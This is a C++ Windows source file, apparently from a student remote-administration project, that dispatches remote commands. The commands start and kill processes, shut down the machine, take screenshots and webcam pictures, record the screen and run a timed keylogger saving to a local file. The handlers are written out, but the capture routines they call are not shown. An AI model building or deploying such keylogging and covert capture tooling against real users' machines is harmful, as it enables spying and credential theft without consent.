#include "executeCommand.h"
#include <tlhelp32.h>
#include <psapi.h>

// Loại bỏ g_current_sender vì server không gửi email nữa

int parse_keylogger_duration(const string& command) {
  size_t pos = command.find("keylogger");
  if (pos == string::npos) return 30;  // default 30 seconds

  string remaining = command.substr(pos + 9);  // skip "keylogger"

  // Tìm số trong chuỗi
  regex numberRegex(R"(\d+)");
  smatch match;
  if (regex_search(remaining, match, numberRegex)) {
    return stoi(match.str());
  }

  return 30;  // default
}

static string trim_command_internal(string command) {
  command.erase(command.begin(), find_if(command.begin(), command.end(),
                                         [](int ch) { return !isspace(ch); }));
  command.erase(find_if(command.rbegin(), command.rend(),
                        [](int ch) { return !isspace(ch); })
                    .base(),
                command.end());
  return command;
}

// Hàm tìm process ID theo tên
DWORD find_process_id(const string& processName) {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;
  DWORD processID = 0;

  cout << "[DEBUG] Looking for process: " << processName << endl;

  // Tạo snapshot của tất cả processes
  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    cout << "[DEBUG] Failed to create process snapshot" << endl;
    return 0;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  // Lấy thông tin process đầu tiên
  if (!Process32First(hProcessSnap, &pe32)) {
    cout << "[DEBUG] Failed to get first process" << endl;
    CloseHandle(hProcessSnap);
    return 0;
  }

  cout << "[DEBUG] Scanning running processes..." << endl;
  do {
    // So sánh tên process (case-insensitive)
    string currentProcessName = pe32.szExeFile;
    cout << "[DEBUG] Found process: " << currentProcessName
         << " (PID: " << pe32.th32ProcessID << ")" << endl;

    transform(currentProcessName.begin(), currentProcessName.end(),
              currentProcessName.begin(), ::tolower);

    string targetProcessName = processName;
    transform(targetProcessName.begin(), targetProcessName.end(),
              targetProcessName.begin(), ::tolower);

    // Thêm .exe nếu target không có
    string targetWithExt = targetProcessName;
    if (targetWithExt.find(".exe") == string::npos) {
      targetWithExt += ".exe";
    }

    if (currentProcessName == targetProcessName ||
        currentProcessName == targetWithExt ||
        currentProcessName.find(targetProcessName) != string::npos) {
      processID = pe32.th32ProcessID;
      cout << "[DEBUG] Process match found: " << currentProcessName
           << " (PID: " << processID << ")" << endl;
      break;
    }
  } while (Process32Next(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);

  if (processID == 0) {
    cout << "[DEBUG] Process not found: " << processName << endl;
  }

  return processID;
}

// Hàm terminate process theo PID
bool terminate_process_by_id(DWORD processID) {
  cout << "[DEBUG] Attempting to terminate process PID: " << processID << endl;

  HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
  if (hProcess == NULL) {
    DWORD error = GetLastError();
    cout << "[DEBUG] Failed to open process. Error code: " << error << endl;

    // Thử với quyền cao hơn
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
      error = GetLastError();
      cout << "[DEBUG] Failed to open process with full access. Error: "
           << error << endl;
      return false;
    }
  }

  BOOL result = TerminateProcess(hProcess, 0);
  if (!result) {
    DWORD error = GetLastError();
    cout << "[DEBUG] TerminateProcess failed. Error code: " << error << endl;
  } else {
    cout << "[DEBUG] Process terminated successfully" << endl;
  }

  CloseHandle(hProcess);
  return result != 0;
}

// Hàm terminate process theo tên
bool terminate_process_by_name(const string& processName) {
  DWORD processID = find_process_id(processName);
  if (processID == 0) {
    return false;
  }
  return terminate_process_by_id(processID);
}

void handle_start_program(const string& command) {
  string prog = command.substr(13);  // After "start_program"
  prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!prog.empty()) {
    cout << "Starting program: " << prog << endl;
    HINSTANCE result =
        ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    if (reinterpret_cast<INT_PTR>(result) <= 32) {
      cerr << "Failed to start program. Error code: "
           << reinterpret_cast<INT_PTR>(result) << endl;
    } else {
      cout << "Program started successfully: " << prog << endl;
    }
  } else {
    cout << "No program specified for start_program command" << endl;
  }
}

void handle_start_process(const string& command) {
  string proc = command.substr(13);  // After "start_process"
  proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!proc.empty()) {
    cout << "Starting process: " << proc << endl;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Tạo process mới
    if (CreateProcessA(NULL, const_cast<char*>(proc.c_str()), NULL, NULL, FALSE,
                       0, NULL, NULL, &si, &pi)) {
      cout << "Process started successfully: " << proc
           << " (PID: " << pi.dwProcessId << ")" << endl;

      // Đóng handles
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    } else {
      DWORD error = GetLastError();
      cerr << "Failed to start process. Error code: " << error << endl;
    }
  } else {
    cout << "No process specified for start_process command" << endl;
  }
}

void handle_stop_program(const string& command) {
  string prog = command.substr(12);  // After "stop_program"
  prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
                                   [](int ch) { return !isspace(ch); }));

  if (!prog.empty()) {
    cout << "Stopping program: " << prog << endl;
    cout << "[DEBUG] Original input: '" << prog << "'" << endl;

    // Thử nhiều cách tìm process
    bool success = false;

    // Cách 1: Tên chính xác
    if (terminate_process_by_name(prog)) {
      cout << "Program stopped successfully: " << prog << endl;
      success = true;
    }
    // Cách 2: Thêm .exe
    else if (prog.find(".exe") == string::npos &&
             terminate_process_by_name(prog + ".exe")) {
      cout << "Program stopped successfully: " << prog << ".exe" << endl;
      success = true;
    }
    // Cách 3: Bỏ .exe nếu có
    else if (prog.find(".exe") != string::npos) {
      string nameWithoutExt = prog.substr(0, prog.find(".exe"));
      if (terminate_process_by_name(nameWithoutExt)) {
        cout << "Program stopped successfully: " << nameWithoutExt << endl;
        success = true;
      }
    }

    if (!success) {
      cout << "Failed to stop program: " << prog << endl;
      cout << "Possible reasons:" << endl;
      cout << "- Program is not running" << endl;
      cout << "- Insufficient permissions" << endl;
      cout << "- Process name mismatch" << endl;
      cout << "Try using 'list_process' to see exact process names" << endl;
    }
  } else {
    cout << "No program specified for stop_program command" << endl;
  }
}

void handle_stop_process(const string& command) {
  string param = command.substr(12);  // After "stop_process"
  param.erase(param.begin(), find_if(param.begin(), param.end(),
                                     [](int ch) { return !isspace(ch); }));

  if (!param.empty()) {
    cout << "Stopping process: " << param << endl;

    // Kiểm tra xem param có phải là số (PID) không
    bool isPID = all_of(param.begin(), param.end(), ::isdigit);

    if (isPID) {
      // Terminate by PID
      DWORD processID = stoul(param);
      if (terminate_process_by_id(processID)) {
        cout << "Process stopped successfully (PID: " << processID << ")"
             << endl;
      } else {
        cout << "Failed to stop process with PID: " << processID << endl;
      }
    } else {
      // Terminate by name - sử dụng cùng logic với stop_program
      bool success = false;

      // Cách 1: Tên chính xác
      if (terminate_process_by_name(param)) {
        cout << "Process stopped successfully: " << param << endl;
        success = true;
      }
      // Cách 2: Thêm .exe
      else if (param.find(".exe") == string::npos &&
               terminate_process_by_name(param + ".exe")) {
        cout << "Process stopped successfully: " << param << ".exe" << endl;
        success = true;
      }
      // Cách 3: Bỏ .exe nếu có
      else if (param.find(".exe") != string::npos) {
        string nameWithoutExt = param.substr(0, param.find(".exe"));
        if (terminate_process_by_name(nameWithoutExt)) {
          cout << "Process stopped successfully: " << nameWithoutExt << endl;
          success = true;
        }
      }

      if (!success) {
        cout << "Failed to stop process: " << param << endl;
        cout << "Try using 'list_process' to see exact process names" << endl;
      }
    }
  } else {
    cout << "No process specified for stop_process command" << endl;
  }
}

void handle_get_picture(const string& outFile) { take_picture(outFile); }

void handle_get_screenshot(const string& outFile) { take_screenshot(outFile); }

void handle_list_programs(const string& outFile) {
  list_programs_to_file(outFile);  // Running programs
}

void handle_list_processes(const string& outFile) {
  list_processes_to_file(outFile);  // Processes with PID
}

void handle_list_installed(const string& outFile) {
  list_installed_programs_to_file(outFile);  // Installed programs
}

void handle_keylogger(const string& command, const string& outFile) {
  istringstream iss(command);
  string cmd;
  int duration = 10;  // mặc định
  iss >> cmd >> duration;

  cout << "Starting keylogger for " << duration << " seconds..." << endl;
  start_keylogger(outFile, duration);
}

void handle_shutdown() {
  cout << "Initiating system shutdown..." << endl;
  if (system("shutdown /s /t 0") != 0) {
    cerr << "Shutdown command failed" << endl;
  } else {
    cout << "Shutdown initiated successfully" << endl;
  }
}

void handle_restart() {
  cout << "Restarting system..." << endl;
  system("shutdown /r /t 5 /c \"Remote restart initiated\"");
}

void handle_cancel_shutdown() {
  cout << "Cancelling shutdown/restart..." << endl;
  system("shutdown /a");
}

void handle_stop_recording() {
  cout << "[Server] Stopping recording..." << endl;
  stop_recording();
}

void handle_start_recording(const std::string& outFile) {
  cout << "[Server] Starting recording and saving to: " << outFile << endl;
  start_recording(outFile);
}

void execute_command(const string& command) {
  cout << "[Execute] Processing command: " << command << endl;

  if (command.find("start_program") == 0) {
    handle_start_program(command);
  } else if (command.find("start_process") == 0) {
    handle_start_process(command);
  } else if (command.find("stop_program") == 0) {
    handle_stop_program(command);
  } else if (command.find("stop_process") == 0) {
    handle_stop_process(command);
  } else if (command == "shutdown") {
    handle_shutdown();
  } else if (command == "restart") {
    handle_restart();
  } else if (command == "cancel_shutdown") {
    handle_cancel_shutdown();
  } else if (command == "stop_recording") {
    handle_stop_recording();
  } else if (command.find("keylogger") == 0) {
    handle_keylogger(command, "C:/MMT/keylog.txt");
  } else {
    cout << "[Execute] Unknown command: " << command << endl;
  }
}

void execute_command_with_file(const string& command,
                               const string& outputFile) {
  cout << "[Execute] Processing command with file output: " << command << endl;

  if (command == "get_screenshot") {
    handle_get_screenshot(outputFile);
  } else if (command == "get_picture") {
    handle_get_picture(outputFile);
  } else if (command == "list_program") {
    handle_list_programs(outputFile);
  } else if (command == "list_process") {
    handle_list_processes(outputFile);
  } else if (command == "list_installed") {
    handle_list_installed(outputFile);
  } else if (command.find("keylogger") == 0) {
    handle_keylogger(command, outputFile);
  } else if (command == "start_recording") {
    handle_start_recording(outputFile);
  } else {
    cout << "[Execute] Unknown command with file: " << command << endl;
    // Tạo file error
    ofstream errorFile(outputFile);
    if (errorFile.is_open()) {
      errorFile << "Error: Unknown command - " << command << endl;
      errorFile.close();
    }
  }
}